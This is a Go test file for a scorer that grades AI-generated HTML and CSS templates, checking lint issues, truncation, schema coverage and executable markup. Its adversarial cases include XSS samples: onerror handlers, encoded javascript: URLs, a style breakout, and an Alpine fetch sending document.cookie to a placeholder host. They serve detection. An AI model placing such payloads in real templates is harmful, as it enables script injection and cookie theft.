package templateeval

import (
	"context"
	"reflect"
	"strings"
	"testing"
	"time"

	"mahresources/application_context"
	"mahresources/mrql"
	"mahresources/shortcodes"
)

func pairCase() Case {
	return Case{ID: "t-pair", Kind: KindPair, Carrier: "group", Slot: "CustomHeader", Prompt: "x"}
}

func pairDraft(html, css string, issues ...shortcodes.LintIssue) Draft {
	return Draft{Status: 200, Target: "bundle", Valid: true, Slots: map[string]string{"CustomHeader": html, "CustomHeaderCSS": css}, Issues: issues}
}

func okPreview(html string) map[string]Preview {
	return map[string]Preview{"CustomHeader": {Status: 200, HTML: html}}
}

func TestScoreChecks(t *testing.T) {
	known := shortcodes.KnownFromBuiltins()
	metaCase := Case{ID: "t-meta", Kind: KindMetaSchema, Carrier: "group", Prompt: "x", ExpectFields: []string{"isbn"}}
	metaDraft := func(schema string) Draft {
		return Draft{Status: 200, Target: "metaschema", Valid: true, Content: schema}
	}
	advCase := pairCase()
	advCase.Adversarial = true
	cssCase := Case{ID: "t-css", Kind: KindSlot, Carrier: "group", Slot: "CustomCSS", Prompt: "x"}
	bundleCase := Case{ID: "t-bundle", Kind: KindBundle, Carrier: "note", Prompt: "x"}
	expectBundle := Case{ID: "t-bundle-expect", Kind: KindBundle, Carrier: "note", Prompt: "x", ExpectSlots: []string{"CustomHeader", "CustomSidebar"}}

	tests := []struct {
		name     string
		c        Case
		draft    Draft
		calls    []Call
		previews map[string]Preview
		check    func(t *testing.T, got Checks)
		pass     bool
	}{
		{
			name: "clean pair passes", c: pairCase(),
			draft:    pairDraft(`<h1>[meta path="author"]</h1>`, `.h{}`),
			previews: okPreview(`<h1>Ann</h1>`),
			pass:     true,
		},
		{
			name: "provider error", c: pairCase(),
			draft: Draft{Status: 502, Error: "template generation provider error"},
			check: func(t *testing.T, got Checks) {
				if got.ProviderError == "" || got.HTTPStatus != 502 {
					t.Fatalf("provider error not recorded: %#v", got)
				}
			},
		},
		{
			name: "lint errors and warnings", c: pairCase(),
			draft: pairDraft(`<h1>x</h1>`, ``,
				shortcodes.LintIssue{Severity: shortcodes.SeverityError, Message: "[conditional] must be a block: [conditional]…[/conditional]"},
				shortcodes.LintIssue{Severity: shortcodes.SeverityWarning, Message: `[meta] has both hide-empty and default; hide-empty wins and the default is never shown`}),
			previews: okPreview(`<h1>x</h1>`),
			check: func(t *testing.T, got Checks) {
				if got.LintErrors != 1 || got.LintWarnings != 1 {
					t.Fatalf("lint counts = %d/%d", got.LintErrors, got.LintWarnings)
				}
			},
		},
		{
			name: "unknown attribute warning does not fail", c: pairCase(),
			draft:    pairDraft(`<h1>x</h1>`, ``, shortcodes.LintIssue{Severity: shortcodes.SeverityWarning, Message: `unknown attribute "colour" on [meta]`}),
			previews: okPreview(`<h1>x</h1>`),
			check: func(t *testing.T, got Checks) {
				if got.UnknownAttributes != 1 {
					t.Fatalf("unknown attributes = %d", got.UnknownAttributes)
				}
			},
			pass: true,
		},
		{
			name: "MRQL error", c: pairCase(),
			draft:    pairDraft(`<h1>x</h1>`, ``, shortcodes.LintIssue{Severity: shortcodes.SeverityError, Message: "MRQL error in query: bad"}),
			previews: okPreview(`<h1>x</h1>`),
			check: func(t *testing.T, got Checks) {
				if got.MRQLErrors != 1 {
					t.Fatalf("mrql errors = %d", got.MRQLErrors)
				}
			},
		},
		{
			name: "unknown shortcode far from any built-in", c: pairCase(),
			draft:    pairDraft(`<div>[star-rating value="4"] [meta path="a"] [plugin:x:y] [/rating]</div>`, `a[href]{} [data-x="y"]{}`),
			previews: okPreview(`<div>stars</div>`),
			check: func(t *testing.T, got Checks) {
				want := []string{"plugin:x:y", "rating", "star-rating"}
				if !reflect.DeepEqual(got.UnknownShortcodes, want) {
					t.Fatalf("unknown shortcodes = %v, want %v", got.UnknownShortcodes, want)
				}
			},
		},
		{
			name: "CSS attribute selectors are not shortcodes", c: cssCase,
			draft: Draft{Status: 200, Target: "slot", Valid: true, Content: `[hidden]{display:none} input[type="text"]{} [data-theme="dark"] .x{}`},
			pass:  true,
		},
		{
			name: "metaschema compile failure", c: metaCase,
			draft: metaDraft(`{"type":"object","properties":{"isbn":{"type":"nope"}}}`),
			check: func(t *testing.T, got Checks) {
				if got.SchemaCompileError == "" {
					t.Fatal("compile failure not recorded")
				}
			},
		},
		{
			name: "fixture meta fails generated schema", c: metaCase,
			draft: metaDraft(`{"type":"object","properties":{"isbn":{"type":"string"}},"required":["isbn","missingField"]}`),
			check: func(t *testing.T, got Checks) {
				if got.FixtureMetaInvalid == 0 {
					t.Fatal("fixture validation failure not counted")
				}
			},
		},
		{
			name: "empty schema cannot pass", c: metaCase,
			draft: metaDraft(`{}`),
			check: func(t *testing.T, got Checks) {
				if got.SchemaProperties != 0 || len(got.MissingExpectFields) != 1 {
					t.Fatalf("got %#v", got)
				}
			},
		},
		{
			name: "schema missing an expected field", c: metaCase,
			draft: metaDraft(`{"type":"object","properties":{"author":{"type":"string"}}}`),
			check: func(t *testing.T, got Checks) {
				if !reflect.DeepEqual(got.MissingExpectFields, []string{"isbn"}) {
					t.Fatalf("missing = %v", got.MissingExpectFields)
				}
			},
		},
		{
			name: "schema with the expected field passes", c: metaCase,
			draft: metaDraft(`{"type":"object","properties":{"author":{"type":"string"},"isbn":{"type":"string"}}}`),
			check: func(t *testing.T, got Checks) {
				if got.FieldCoverage != 1 {
					t.Fatalf("coverage = %v", got.FieldCoverage)
				}
			},
			pass: true,
		},
		{
			name: "incomplete pair in the raw provider output", c: pairCase(),
			draft: Draft{Status: 502, Error: "template generation provider error"},
			calls: []Call{{FinishReason: "stop", Content: `{"slots":{"CustomHeader":"<p>x</p>"},"explanation":"e"}`}},
			check: func(t *testing.T, got Checks) {
				if got.IncompletePairs != 1 {
					t.Fatalf("incomplete pairs = %d", got.IncompletePairs)
				}
			},
		},
		{
			name: "bundle coverage", c: bundleCase,
			draft:    Draft{Status: 200, Target: "bundle", Valid: true, Slots: map[string]string{"CustomHeader": "<p>x</p>", "CustomHeaderCSS": ""}},
			previews: map[string]Preview{"CustomHeader": {Status: 200, HTML: "<p>x</p>"}},
			check: func(t *testing.T, got Checks) {
				if got.RequestedSlots != len(BundleSlots("note")) || got.ReturnedSlots != 2 || got.BundleCoverage <= 0 || got.BundleCoverage >= 1 {
					t.Fatalf("coverage %#v", got)
				}
			},
			pass: true,
		},
		{
			name: "truncation from finish reason", c: pairCase(),
			draft:    pairDraft(`<h1>x</h1>`, ``),
			calls:    []Call{{FinishReason: "length"}},
			previews: okPreview(`<h1>x</h1>`),
			check: func(t *testing.T, got Checks) {
				if !got.Truncated {
					t.Fatal("truncation not detected")
				}
			},
		},
		{
			name: "the bundle degrade issue after a clean stop is malformed, not truncated", c: bundleCase,
			draft: Draft{Status: 200, Target: "bundle", Issues: []shortcodes.LintIssue{{Severity: shortcodes.SeverityError, Message: "The whole-template response was too large or malformed. Try generating slots individually."}}},
			calls: []Call{{FinishReason: "stop", Content: `{"slots":{"CustomHeader":"<p>`}},
			check: func(t *testing.T, got Checks) {
				if got.Truncated || !got.Malformed || got.LintErrors != 0 {
					t.Fatalf("truncated=%v malformed=%v lint=%d", got.Truncated, got.Malformed, got.LintErrors)
				}
			},
		},
		{
			name: "the bundle degrade issue after a length stop is truncated", c: bundleCase,
			draft: Draft{Status: 200, Target: "bundle", Issues: []shortcodes.LintIssue{{Severity: shortcodes.SeverityError, Message: "The whole-template response was too large or malformed. Try generating slots individually."}}},
			calls: []Call{{FinishReason: "length", Content: `{"slots":{"CustomHeader":"<p>`}},
			check: func(t *testing.T, got Checks) {
				if !got.Truncated || got.Malformed {
					t.Fatalf("truncated=%v malformed=%v", got.Truncated, got.Malformed)
				}
			},
		},
		{
			name: "invalid JSON from a single target is malformed", c: cssCase,
			draft: Draft{Status: 502, Error: "template generation provider error"},
			calls: []Call{{FinishReason: "stop", Content: `{"content": ".a{`}},
			check: func(t *testing.T, got Checks) {
				if got.Truncated || !got.Malformed {
					t.Fatalf("truncated=%v malformed=%v", got.Truncated, got.Malformed)
				}
			},
		},
		{
			name: "a bundle slot cut at the content cap is truncated", c: bundleCase,
			draft: Draft{Status: 200, Target: "bundle", Valid: true, Slots: map[string]string{
				"CustomHeader": "<p>" + strings.Repeat("x", application_context.MaxTemplateGeneratedContentLength-3), "CustomHeaderCSS": ""}},
			previews: map[string]Preview{"CustomHeader": {Status: 200, HTML: "<p>x</p>"}},
			check: func(t *testing.T, got Checks) {
				if !got.Truncated {
					t.Fatal("a sliced slot was not counted as truncated")
				}
			},
		},
		{
			name: "an oversized single draft is truncated", c: cssCase,
			draft: Draft{Status: 502, Error: "template generation provider error"},
			calls: []Call{{FinishReason: "stop", Content: `{"content":"` + strings.Repeat("a", application_context.MaxTemplateGeneratedContentLength+1) + `","explanation":"e"}`}},
			check: func(t *testing.T, got Checks) {
				if !got.Truncated || got.Malformed {
					t.Fatalf("truncated=%v malformed=%v", got.Truncated, got.Malformed)
				}
			},
		},
		{
			name: "an empty requested pair fails", c: pairCase(),
			draft: pairDraft(``, ``),
			check: func(t *testing.T, got Checks) {
				if !reflect.DeepEqual(got.MissingSlots, []string{"CustomHeader"}) {
					t.Fatalf("missing slots = %v", got.MissingSlots)
				}
			},
		},
		{
			name: "a bundle without an expected slot fails", c: expectBundle,
			draft:    Draft{Status: 200, Target: "bundle", Valid: true, Slots: map[string]string{"CustomHeader": "<p>x</p>", "CustomHeaderCSS": "", "CustomSidebar": " ", "CustomSidebarCSS": ""}},
			previews: map[string]Preview{"CustomHeader": {Status: 200, HTML: "<p>x</p>"}},
			check: func(t *testing.T, got Checks) {
				if !reflect.DeepEqual(got.MissingSlots, []string{"CustomSidebar"}) {
					t.Fatalf("missing slots = %v", got.MissingSlots)
				}
			},
		},
		{
			name: "a bundle may leave unexpected slots empty", c: expectBundle,
			draft: Draft{Status: 200, Target: "bundle", Valid: true, Slots: map[string]string{
				"CustomHeader": "<p>x</p>", "CustomHeaderCSS": "", "CustomSidebar": "<p>y</p>", "CustomSidebarCSS": "", "CustomSummary": "", "CustomSummaryCSS": ""}},
			previews: map[string]Preview{"CustomHeader": {Status: 200, HTML: "<p>x</p>"}, "CustomSidebar": {Status: 200, HTML: "<p>y</p>"}},
			pass:     true,
		},
		{
			name: "style and script bodies are not visible content", c: pairCase(),
			draft:    pairDraft(`<style>.a{color:red}</style>[meta path="none" hide-empty="true"]`, ``),
			previews: okPreview("<style>.a{color:red}</style><script>var a = 1;</script>"),
			check: func(t *testing.T, got Checks) {
				if !reflect.DeepEqual(got.RenderEmptySlots, []string{"CustomHeader"}) {
					t.Fatalf("render-empty = %v", got.RenderEmptySlots)
				}
			},
		},
		{
			name: "an unknown shortcode glued to text in HTML", c: pairCase(),
			draft:    pairDraft(`<p>Rating[star-rating value="4"]</p>`, ``),
			previews: okPreview(`<p>Rating</p>`),
			check: func(t *testing.T, got Checks) {
				if !reflect.DeepEqual(got.UnknownShortcodes, []string{"star-rating"}) {
					t.Fatalf("unknown shortcodes = %v", got.UnknownShortcodes)
				}
			},
		},
		{
			name: "attribute selectors with spaced operators and style blocks are not shortcodes", c: pairCase(),
			draft:    pairDraft(`<style>[hidden]{display:none} [data-state = "on"]{}</style><p>x</p>`, `[data-state = "on"] .x{} [data-x="y"]{} [hidden]{}`),
			previews: okPreview(`<p>x</p>`),
			pass:     true,
		},
		{
			name: "a shortcode-shaped unknown in CSS is flagged", c: cssCase,
			draft: Draft{Status: 200, Target: "slot", Valid: true, Content: `.a{color:[theme-color name="accent"]}`},
			check: func(t *testing.T, got Checks) {
				if !reflect.DeepEqual(got.UnknownShortcodes, []string{"theme-color"}) {
					t.Fatalf("unknown shortcodes = %v", got.UnknownShortcodes)
				}
			},
		},
		{
			name: "event handler after a quoted attribute holding >", c: advCase,
			draft:    pairDraft(`<a title="a>b" onclick="x()">t</a>`, ``),
			previews: okPreview(`<a>t</a>`),
			check:    wantFlags("event-handler"),
		},
		{
			name: "unquoted Alpine attribute with a network call", c: advCase,
			draft:    pairDraft(`<div x-init=fetch('/x')>t</div>`, ``),
			previews: okPreview(`<div>t</div>`),
			check:    wantFlags("alpine-network"),
		},
		{
			name: "entity-encoded javascript URL", c: advCase,
			draft:    pairDraft(`<a href="java&#115;cript:alert(1)">t</a><a href=" JAVA&#x09;SCRIPT:x">u</a>`, ``),
			previews: okPreview(`<a>t</a>`),
			check:    wantFlags("javascript-url"),
		},
		{
			name: "srcdoc and embedded content", c: advCase,
			draft:    pairDraft(`<iframe srcdoc="&lt;script&gt;1&lt;/script&gt;"></iframe><object data="x"></object><embed src="y">`, ``),
			previews: okPreview(`<p>t</p>`),
			check:    wantFlags("srcdoc", "embed"),
		},
		{
			name: "markup after a style breakout in CSS is read as HTML", c: advCase,
			draft:    pairDraft(`<p>x</p>`, `.a{}</style><img src=x onerror=alert(1)>`),
			previews: okPreview(`<p>x</p>`),
			check:    wantFlags("event-handler", "style-breakout"),
		},
		{
			name: "render-empty slot", c: pairCase(),
			draft:    pairDraft(`<div class="c"><h2>[meta path="missing" hide-empty="true"]</h2></div>`, ``),
			previews: okPreview("<div class=\"c\"><h2></h2></div>\n<!-- c -->"),
			check: func(t *testing.T, got Checks) {
				if !reflect.DeepEqual(got.RenderEmptySlots, []string{"CustomHeader"}) {
					t.Fatalf("render-empty = %v", got.RenderEmptySlots)
				}
			},
		},
		{
			name: "an image is not empty", c: pairCase(),
			draft:    pairDraft(`<img src="/x">`, ``),
			previews: okPreview(`<img src="/x">`),
			pass:     true,
		},
		{
			name: "leftover shortcode text", c: pairCase(),
			draft:    pairDraft(`<p>[property path="Name"]</p>`, ``),
			previews: okPreview(`<p>[property path=Name]</p>`),
			check: func(t *testing.T, got Checks) {
				if !reflect.DeepEqual(got.LeftoverShortcodeText, []string{"CustomHeader"}) {
					t.Fatalf("leftover = %v", got.LeftoverShortcodeText)
				}
			},
		},
		{
			name: "preview error issue and render error marker", c: pairCase(),
			draft: pairDraft(`<p>x</p>`, ``),
			previews: map[string]Preview{"CustomHeader": {Status: 200, HTML: `<p>x</p><span class="mrql-error text-red-700 font-mono">bad</span>`,
				Issues: []shortcodes.LintIssue{{Severity: shortcodes.SeverityError, Message: "boom"}}}},
			check: func(t *testing.T, got Checks) {
				if got.PreviewErrors != 2 {
					t.Fatalf("preview errors = %d", got.PreviewErrors)
				}
			},
		},
		{
			name: "a lint error the preview repeats is counted once, under lint", c: pairCase(),
			draft: pairDraft(`<p>x</p>`, ``, shortcodes.LintIssue{Severity: shortcodes.SeverityError, Message: "MRQL error in query: bad"}),
			previews: map[string]Preview{"CustomHeader": {Status: 200, HTML: `<p>x</p>`,
				Issues: []shortcodes.LintIssue{{Severity: shortcodes.SeverityError, Message: "MRQL error in query: bad"}}}},
			check: func(t *testing.T, got Checks) {
				if got.PreviewErrors != 0 || got.LintErrors != 1 {
					t.Fatalf("preview errors = %d, lint errors = %d", got.PreviewErrors, got.LintErrors)
				}
			},
		},
		{
			name: "field coverage is heuristic and does not gate markup", c: pairCase(),
			draft:    pairDraft(`<p>[meta path="author"]</p>`, ``),
			previews: okPreview(`<p>Ann</p>`),
			check: func(t *testing.T, got Checks) {
				if got.FieldCoverage <= 0 || got.FieldCoverage >= 1 {
					t.Fatalf("coverage = %v", got.FieldCoverage)
				}
			},
			pass: true,
		},
		{
			name: "script tag flags an adversarial case", c: advCase,
			draft:    pairDraft(`<p>x</p><SCRIPT>fetch('https://example.invalid')</SCRIPT>`, ``),
			previews: okPreview(`<p>x</p>`),
			check:    wantFlags("script"),
		},
		{
			name: "inline event handler", c: advCase,
			draft:    pairDraft(`<img src="x" onerror="alert(1)">`, ``),
			previews: okPreview(`<img src="x">`),
			check:    wantFlags("event-handler"),
		},
		{
			name: "Alpine attribute with a network call", c: advCase,
			draft:    pairDraft(`<div x-init="fetch('https://example.invalid/?d='+document.cookie)">x</div><button @click="location='https://e.invalid'">b</button>`, ``),
			previews: okPreview(`<div>x</div>`),
			check:    wantFlags("alpine-network"),
		},
		{
			name: "harmless Alpine toggle is not flagged", c: advCase,
			draft:    pairDraft(`<div x-data="{open:false}"><button @click="open = !open">t</button></div>`, ``),
			previews: okPreview(`<div>t</div>`),
			pass:     true,
		},
		{
			name: "javascript URL", c: advCase,
			draft:    pairDraft(`<a href="JavaScript:alert(1)">x</a>`, ``),
			previews: okPreview(`<a>x</a>`),
			check:    wantFlags("javascript-url"),
		},
		{
			name: "style breakout in CSS", c: advCase,
			draft:    pairDraft(`<p>x</p>`, `.a{}</style><div x-init="1">`),
			previews: okPreview(`<p>x</p>`),
			check:    wantFlags("style-breakout"),
		},
		{
			name: "executable markup is recorded but does not gate a normal case", c: pairCase(),
			draft:    pairDraft(`<p>x</p><script>console.log(1)</script>`, ``),
			previews: okPreview(`<p>x</p>`),
			check:    wantFlags("script"),
			pass:     true,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := Score(tt.c, tt.draft, tt.calls, tt.previews, known)
			if tt.check != nil {
				tt.check(t, got)
			}
			if got.Pass() != tt.pass {
				t.Fatalf("Pass() = %v, want %v; checks %#v", got.Pass(), tt.pass, got)
			}
		})
	}
}

func wantFlags(flags ...string) func(t *testing.T, got Checks) {
	return func(t *testing.T, got Checks) {
		t.Helper()
		if !reflect.DeepEqual(got.ExecutableMarkup, flags) {
			t.Fatalf("executable markup = %v, want %v", got.ExecutableMarkup, flags)
		}
	}
}

// TestLintMessagePrefixesStayClassified lints known-bad markup with the real
// linter. Score classifies issues by message prefix, so a rewording in
// shortcodes/lint.go must fail here rather than silently zero a metric.
func TestLintMessagePrefixesStayClassified(t *testing.T) {
	opts := shortcodes.LintOptions{
		Known:        shortcodes.KnownFromBuiltins(),
		ValidateMRQL: func(q string) error { _, err := mrql.Parse(q); return err },
	}
	cases := []struct {
		markup string
		class  issueClass
	}{
		{`[meta path="a" colour="red"]`, classUnknownAttribute},
		{`[mrql query="type = = ="]`, classMRQL},
		{`[metta path="a"]`, classUnknownShortcode},
	}
	for _, c := range cases {
		found := false
		var messages []string
		for _, issue := range shortcodes.Lint(c.markup, opts) {
			messages = append(messages, issue.Message)
			if classifyIssue(issue) == c.class {
				found = true
			}
		}
		if !found {
			t.Errorf("%s: no issue classified as %v; lint said %s", c.markup, c.class, strings.Join(messages, " | "))
		}
	}
}

type malformedProvider struct{}

func (malformedProvider) GenerateDraft(context.Context, string, string, int) (string, error) {
	return `{"slots":{"CustomHeader":"<p>`, nil
}

// TestBundleDegradeMessageStaysClassified drives the real generator into its
// malformed-bundle branch, so a rewording of that message in
// application_context/template_generation.go fails here instead of zeroing the
// malformed and truncation counts.
func TestBundleDegradeMessageStaysClassified(t *testing.T) {
	generator := application_context.NewTemplateGenerator(malformedProvider{}, application_context.TemplateGenerationConfig{APIKey: "k", Timeout: time.Second})
	result, err := generator.GenerateTemplate(context.Background(), application_context.TemplateGenerationInput{
		Target: application_context.TemplateTargetBundle, EntityType: "group", BundleSlots: []string{"CustomHeader", "CustomHeaderCSS"},
	}, "a template")
	if err != nil {
		t.Fatal(err)
	}
	if len(result.Issues) == 0 {
		t.Fatalf("the generator reported no issue for a malformed bundle: %#v", result)
	}
	for _, issue := range result.Issues {
		if classifyIssue(issue) != classBundleDegraded {
			t.Fatalf("degrade message %q is not classified", issue.Message)
		}
	}
}
